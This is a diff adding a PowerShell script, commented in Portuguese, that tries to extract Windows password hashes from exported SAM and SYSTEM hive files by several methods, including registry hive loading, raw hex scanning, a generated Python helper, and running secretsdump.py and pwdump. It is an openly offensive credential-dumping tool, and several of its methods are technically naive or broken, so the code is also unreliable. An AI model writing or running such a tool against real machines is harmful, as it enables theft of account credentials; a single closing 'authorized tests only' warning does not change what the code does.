@@ -1,0 +1,395 @@
+<#
+.SYNOPSIS
+    DESCRIPTOGRAFADOR SAM - Extrai hashes do arquivo SAM
+.DESCRIPTION
+    Script para descriptografar arquivos SAM.save e extrair hashes de senhas
+    Requer arquivos SAM e SYSTEM exportados
+#>
+
+# Configurações iniciais
+$ErrorActionPreference = "Continue"
+Clear-Host
+$Host.UI.RawUI.WindowTitle = "DESCRIPTOGRAFADOR SAM"
+
+function Write-Status {
+    param([string]$Message, [string]$Color = "White")
+    $timestamp = Get-Date -Format "HH:mm:ss"
+    Write-Host "[$timestamp] $Message" -ForegroundColor $Color
+}
+
+Write-Status "INICIANDO DESCRIPTOGRAFADOR SAM" "Magenta"
+
+# Verificar se estamos no diretório correto
+$samFile = "sam.save"
+$systemFile = "system.save"
+
+if (-not (Test-Path $samFile)) {
+    Write-Status "Arquivo SAM nao encontrado. Procurando arquivos SAM..." "Yellow"
+    
+    # Procurar arquivos SAM em subdiretórios
+    $samFiles = Get-ChildItem -Path . -Recurse -Filter "*sam*" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "sam" }
+    $systemFiles = Get-ChildItem -Path . -Recurse -Filter "*system*" -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "system" }
+    
+    if ($samFiles.Count -eq 0) {
+        Write-Status "Nenhum arquivo SAM encontrado. Execute primeiro o coletor de credenciais." "Red"
+        exit
+    }
+    
+    $samFile = $samFiles[0].FullName
+    $systemFile = $systemFiles[0].FullName
+    
+    Write-Status "Usando arquivo SAM: $samFile" "Green"
+    Write-Status "Usando arquivo SYSTEM: $systemFile" "Green"
+}
+
+# Verificar se os arquivos existem
+if (-not (Test-Path $samFile)) {
+    Write-Status "ERRO: Arquivo SAM nao encontrado: $samFile" "Red"
+    exit
+}
+
+if (-not (Test-Path $systemFile)) {
+    Write-Status "ERRO: Arquivo SYSTEM nao encontrado: $systemFile" "Red"
+    exit
+}
+
+Write-Status "Arquivos localizados com sucesso" "Green"
+Write-Status "Tamanho do SAM: $([math]::Round((Get-Item $samFile).Length/1KB,2)) KB" "Cyan"
+Write-Status "Tamanho do SYSTEM: $([math]::Round((Get-Item $systemFile).Length/1KB,2)) KB" "Cyan"
+
+# ========== MÉTODO 1: Usando regedt32 para extrair dados ==========
+function Invoke-RegistryExport {
+    Write-Status "Tentando exportar dados do SAM via registro..." "Yellow"
+    
+    try {
+        # Criar diretório de trabalho
+        $workDir = "SAM_Analysis_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+        New-Item -ItemType Directory -Name $workDir -Force | Out-Null
+        Set-Location $workDir
+        
+        Write-Status "Carregando hive do SAM no registro..." "Cyan"
+        
+        # Tentar carregar o hive do SAM
+        $result = reg load "HKLM\SAM_ANALYSIS" (Get-Location).Path + "\..\$samFile" 2>&1
+        if ($LASTEXITCODE -eq 0) {
+            Write-Status "Hive do SAM carregado com sucesso" "Green"
+            
+            # Exportar dados dos usuários
+            Write-Status "Exportando dados dos usuarios..." "Cyan"
+            reg export "HKLM\SAM_ANALYSIS\SAM\Domains\Account\Users" "users_export.reg" /y 2>&1 | Out-Null
+            
+            if (Test-Path "users_export.reg") {
+                Write-Status "Dados dos usuarios exportados: users_export.reg" "Green"
+                $userData = Get-Content "users_export.reg" -Raw
+                
+                # Procurar por hashes nos dados exportados
+                if ($userData -match "[0-9A-Fa-f]{32}") {
+                    $hashes = [regex]::Matches($userData, "[0-9A-Fa-f]{32}")
+                    Write-Status "HASHES ENCONTRADOS: $($hashes.Count)" "Green"
+                    
+                    foreach ($hash in $hashes) {
+                        Write-Status "Hash: $($hash.Value)" "Yellow"
+                    }
+                }
+            }
+            
+            # Descarregar o hive
+            reg unload "HKLM\SAM_ANALYSIS" 2>&1 | Out-Null
+            Write-Status "Hive do SAM descarregado" "Green"
+            
+        } else {
+            Write-Status "Falha ao carregar hive do SAM" "Red"
+        }
+        
+        Set-Location ..
+    } catch {
+        Write-Status "Erro no metodo de registro: $($_.Exception.Message)" "Red"
+    }
+}
+
+# ========== MÉTODO 2: Análise hexadecimal do SAM ==========
+function Invoke-HexAnalysis {
+    Write-Status "Iniciando analise hexadecimal do arquivo SAM..." "Yellow"
+    
+    try {
+        # Ler arquivo SAM como bytes
+        Write-Status "Lendo arquivo SAM como bytes..." "Cyan"
+        $samBytes = [System.IO.File]::ReadAllBytes((Get-Item $samFile).FullName)
+        Write-Status "Bytes lidos: $($samBytes.Length)" "Green"
+        
+        # Procurar por padrões de hashes NTLM
+        Write-Status "Procurando por padroes de hashes NTLM..." "Cyan"
+        
+        # Padrão NTLM hash (32 caracteres hexadecimais)
+        $hexString = [System.BitConverter]::ToString($samBytes).Replace("-", "")
+        
+        # Procurar por sequências que parecem hashes
+        $potentialHashes = @()
+        
+        for ($i = 0; $i -lt $hexString.Length - 64; $i++) {
+            $chunk = $hexString.Substring($i, 32)
+            
+            # Verificar se parece um hash (apenas caracteres hex)
+            if ($chunk -match "^[0-9A-F]{32}$") {
+                # Verificar se não é uma sequência muito repetitiva
+                $uniqueChars = ($chunk.ToCharArray() | Sort-Object -Unique).Count
+                if ($uniqueChars -gt 8) {  # Evitar sequências como "0000..." ou "FFFF..."
+                    $potentialHashes += $chunk
+                    Write-Status "Hash potencial encontrado: $chunk" "Yellow"
+                }
+            }
+        }
+        
+        if ($potentialHashes.Count -gt 0) {
+            Write-Status "HASHES POTENCIAIS ENCONTRADOS: $($potentialHashes.Count)" "Green"
+            $uniqueHashes = $potentialHashes | Sort-Object -Unique
+            return $uniqueHashes
+        } else {
+            Write-Status "Nenhum hash potencial encontrado na analise hexadecimal" "Red"
+        }
+        
+    } catch {
+        Write-Status "Erro na analise hexadecimal: $($_.Exception.Message)" "Red"
+    }
+    
+    return @()
+}
+
+# ========== MÉTODO 3: Usando strings para extrair texto ==========
+function Invoke-StringsAnalysis {
+    Write-Status "Extraindo strings do arquivo SAM..." "Yellow"
+    
+    try {
+        # Método nativo do PowerShell para extrair strings
+        $samContent = [System.IO.File]::ReadAllText((Get-Item $samFile).FullName)
+        
+        # Filtrar apenas caracteres imprimíveis
+        $printableChars = [regex]::Matches($samContent, "[ -~]{4,}")
+        
+        Write-Status "Strings extraidas: $($printableChars.Count)" "Green"
+        
+        # Procurar por nomes de usuário e hashes
+        $interestingStrings = @()
+        
+        foreach ($match in $printableChars) {
+            $string = $match.Value
+            
+            # Procurar por nomes de usuário
+            if ($string -match "(?i)admin|administrator|user|usuario|guest|convidado") {
+                $interestingStrings += "USUARIO: $string"
+            }
+            
+            # Procurar por hashes
+            if ($string -match "^[0-9A-Fa-f]{32}$") {
+                $interestingStrings += "HASH: $string"
+            }
+            
+            # Procurar por SIDs
+            if ($string -match "S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+") {
+                $interestingStrings += "SID: $string"
+            }
+        }
+        
+        return $interestingStrings
+        
+    } catch {
+        Write-Status "Erro na extracao de strings: $($_.Exception.Message)" "Red"
+        return @()
+    }
+}
+
+# ========== MÉTODO 4: Análise com Python (se disponível) ==========
+function Invoke-PythonAnalysis {
+    Write-Status "Verificando se Python esta disponivel para analise..." "Yellow"
+    
+    # Verificar se Python está instalado
+    $python = Get-Command "python" -ErrorAction SilentlyContinue
+    if (-not $python) {
+        $python = Get-Command "python3" -ErrorAction SilentlyContinue
+    }
+    
+    if ($python) {
+        Write-Status "Python encontrado: $($python.Source)" "Green"
+        
+        # Criar script Python para análise SAM
+        $pythonScript = @"
+import sys
+import struct
+import binascii
+
+def analyze_sam(sam_file, system_file):
+    print("Analisando arquivos SAM e SYSTEM...")
+    
+    try:
+        # Ler arquivo SAM
+        with open(sam_file, 'rb') as f:
+            sam_data = f.read()
+        
+        # Procurar por estruturas conhecidas
+        # Buscar por "NTPASSWORD" que precede hashes NTLM
+        if b'NTPASSWORD' in sam_data:
+            idx = sam_data.find(b'NTPASSWORD')
+            print(f"Encontrado NTPASSWORD no offset: {hex(idx)}")
+            
+            # Extrair 16 bytes após (potencial hash NTLM)
+            if idx + 16 < len(sam_data):
+                hash_data = sam_data[idx+10:idx+26]
+                hash_hex = binascii.hexlify(hash_data).decode('ascii')
+                print(f"Hash potencial: {hash_hex}")
+        
+        # Buscar por hashes LM (LAN Manager)
+        if b'LMPASSWORD' in sam_data:
+            idx = sam_data.find(b'LMPASSWORD')
+            print(f"Encontrado LMPASSWORD no offset: {hex(idx)}")
+            
+            # Extrair 16 bytes após
+            if idx + 16 < len(sam_data):
+                hash_data = sam_data[idx+10:idx+26]
+                hash_hex = binascii.hexlify(hash_data).decode('ascii')
+                print(f"Hash LM potencial: {hash_hex}")
+        
+        return True
+        
+    except Exception as e:
+        print(f"Erro na análise: {e}")
+        return False
+
+if __name__ == "__main__":
+    if len(sys.argv) == 3:
+        analyze_sam(sys.argv[1], sys.argv[2])
+"@
+
+        # Salvar script Python
+        $scriptFile = "sam_analyzer.py"
+        $pythonScript | Out-File -FilePath $scriptFile -Encoding UTF8
+        
+        Write-Status "Executando analise com Python..." "Cyan"
+        $output = & $python.Source $scriptFile $samFile $systemFile 2>&1
+        
+        if ($LASTEXITCODE -eq 0) {
+            Write-Status "Analise Python concluida:" "Green"
+            $output | ForEach-Object { Write-Status "PYTHON: $_" "Yellow" }
+        } else {
+            Write-Status "Erro na execucao do Python" "Red"
+        }
+        
+        # Limpar arquivo temporário
+        Remove-Item $scriptFile -ErrorAction SilentlyContinue
+        
+    } else {
+        Write-Status "Python nao encontrado. Pulando analise com Python." "Yellow"
+    }
+}
+
+# ========== MÉTODO 5: Usando ferramentas externas ==========
+function Invoke-ExternalTools {
+    Write-Status "Tentando usar ferramentas externas para descriptografia..." "Yellow"
+    
+    # Verificar se secretsdump.py está disponível (do Impacket)
+    $secretsdump = Get-Command "secretsdump.py" -ErrorAction SilentlyContinue
+    if ($secretsdump) {
+        Write-Status "secretsdump.py encontrado: $($secretsdump.Source)" "Green"
+        
+        try {
+            Write-Status "Executando secretsdump.py..." "Cyan"
+            $output = & $secretsdump.Source -sam $samFile -system $systemFile LOCAL 2>&1
+            
+            if ($LASTEXITCODE -eq 0) {
+                Write-Status "SECRETSDUMP SUCESSO:" "Green"
+                $output | ForEach-Object { 
+                    if ($_ -match ":") {
+                        Write-Status "HASH: $_" "Red"
+                    } else {
+                        Write-Status "INFO: $_" "Yellow"
+                    }
+                }
+                
+                # Salvar output
+                $output | Out-File "secretsdump_output.txt" -Encoding UTF8
+                Write-Status "Output salvo em: secretsdump_output.txt" "Green"
+            }
+        } catch {
+            Write-Status "Erro no secretsdump: $($_.Exception.Message)" "Red"
+        }
+    } else {
+        Write-Status "secretsdump.py nao encontrado. Instale o Impacket." "Yellow"
+    }
+    
+    # Verificar se pwdump está disponível
+    $pwdump = Get-Command "pwdump" -ErrorAction SilentlyContinue
+    if ($pwdump) {
+        Write-Status "pwdump encontrado: $($pwdump.Source)" "Green"
+        
+        try {
+            Write-Status "Executando pwdump..." "Cyan"
+            $output = & $pwdump.Source $samFile 2>&1
+            
+            if ($LASTEXITCODE -eq 0) {
+                Write-Status "PWDUMP SUCESSO:" "Green"
+                $output | ForEach-Object { Write-Status "HASH: $_" "Red" }
+            }
+        } catch {
+            Write-Status "Erro no pwdump: $($_.Exception.Message)" "Red"
+        }
+    } else {
+        Write-Status "pwdump nao encontrado." "Yellow"
+    }
+}
+
+# ========== EXECUÇÃO PRINCIPAL ==========
+Write-Status "INICIANDO PROCESSO DE DESCRIPTOGRAFIA SAM" "Magenta"
+
+# Criar diretório de resultados
+$resultsDir = "SAM_Results_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+New-Item -ItemType Directory -Name $resultsDir -Force | Out-Null
+Set-Location $resultsDir
+
+Write-Status "Diretorio de resultados: $((Get-Location).Path)" "Cyan"
+
+# Executar todos os métodos
+$allResults = @()
+
+Write-Status "=== METODO 1: Exportacao de Registro ===" "Yellow"
+$regResults = Invoke-RegistryExport
+$allResults += $regResults
+
+Write-Status "=== METODO 2: Analise Hexadecimal ===" "Yellow"
+$hexResults = Invoke-HexAnalysis
+if ($hexResults.Count -gt 0) {
+    $allResults += "HASHES HEXADECIMAIS:"
+    $hexResults | ForEach-Object { $allResults += $_ }
+}
+
+Write-Status "=== METODO 3: Extracao de Strings ===" "Yellow"
+$stringResults = Invoke-StringsAnalysis
+if ($stringResults.Count -gt 0) {
+    $allResults += "STRINGS INTERESSANTES:"
+    $stringResults | ForEach-Object { $allResults += $_ }
+}
+
+Write-Status "=== METODO 4: Analise com Python ===" "Yellow"
+Invoke-PythonAnalysis
+
+Write-Status "=== METODO 5: Ferramentas Externas ===" "Yellow"
+Invoke-ExternalTools
+
+# Salvar todos os resultados
+if ($allResults.Count -gt 0) {
+    $allResults | Out-File "sam_analysis_results.txt" -Encoding UTF8
+    Write-Status "Resultados salvos em: sam_analysis_results.txt" "Green"
+}
+
+# Copiar arquivos SAM e SYSTEM para o diretório de resultados
+Copy-Item "..\$samFile" . -ErrorAction SilentlyContinue
+Copy-Item "..\$systemFile" . -ErrorAction SilentlyContinue
+
+Write-Status "PROCESSO DE DESCRIPTOGRAFIA CONCLUIDO" "Green"
+Write-Status "Arquivos no diretorio de resultados:" "Cyan"
+Get-ChildItem . | ForEach-Object { 
+    Write-Status "  $($_.Name) - $([math]::Round($_.Length/1KB,2)) KB" "White" 
+}
+
+Write-Status "AVISO: Os hashes extraidos devem ser usados apenas para testes de seguranca autorizados!" "Red"
+
+# Voltar ao diretório original
+Set-Location ..
